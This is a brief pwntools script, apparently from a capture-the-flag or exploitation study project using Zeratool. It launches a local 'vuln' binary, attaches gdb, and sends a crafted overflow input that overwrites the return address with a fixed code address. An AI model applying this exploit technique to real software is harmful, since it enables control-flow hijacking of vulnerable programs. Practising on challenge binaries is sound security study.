from pwn import * 
elf = process('/home/aditya/Documents/UGRC/Zeratool/challenges/vuln')
inp = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00F\x11@\x00\x00\x00'
#attach gdb
#set context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(elf)
elf.sendline(inp)
elf.interactive()